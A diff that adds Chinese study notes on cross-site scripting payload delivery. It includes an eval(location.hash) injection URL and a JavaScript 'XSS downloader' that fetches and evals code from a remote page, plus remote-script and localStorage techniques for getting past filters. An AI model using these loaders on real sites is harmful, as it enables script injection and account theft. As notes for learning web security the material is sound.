@@ -1,0 +1,30 @@
+shellcode：利用漏洞时所执行的代码
+Exploit：表示完整编写好的漏洞利用工具或程序
+POC：Proof of Concept是一段证明漏洞存在的程序代码片段。
+
+简单的shellcode往往是直接写入页面的，很容易想到，写入的shellcode越长就越容易被过滤，所以更常用的是
+使用一些标签调用shellcode。
+
+1.利用引用远程资源的属性引用远程脚本，可以避免限制url长度等情况；缺点：需要提前上传攻击脚本到指定服务器。
+2.利用window.location.hash属性，http://xxx/xxx.php?input="><script>eval(location.hash.substr(1))</script>"# 任意长度的JavaScript语句作为地址参数
+而且eval()括号内部的内容也就是#后的内容可以编码来增加迷惑性。
+3.XSS downloader	将恶意JavaScript代码写在某个网站的某个页面，然后使用ajax请求该页面，并执行
+例：
+
+function XSS(){
+a=new ActiveXObject('Microsoft.XMLHTTP');
+a.Open('get','http://www.bug.com/11221.html',false);/
+a.send();
+b=a.responseText;
+eval(unescape(b.substring(b.indexOf('BOF|')+4,b.indexOf('|EOF'))));  //用indexOf()函数计算BOF|和|EOF的位置，再用substring()函数方法取出字符串，最后用unescape()函数方法解码执行。
+
+XSS();
+
+而http://www.bug.com/11221.html 页面写入了Shellcode代码：
+Xx09abcxddxBOF|alert(/XSS/)|EOFxxx44xx1212
+
+注意，这种攻击方式写入的shellcode很容易在同一网站被攻击者写入。
+
+4.备用存储技术 window.localStorage可以在本地浏览器存储信息，利用这个对象可以将shellcode存储在目标的浏览器上，
+然后再进行调用。
+
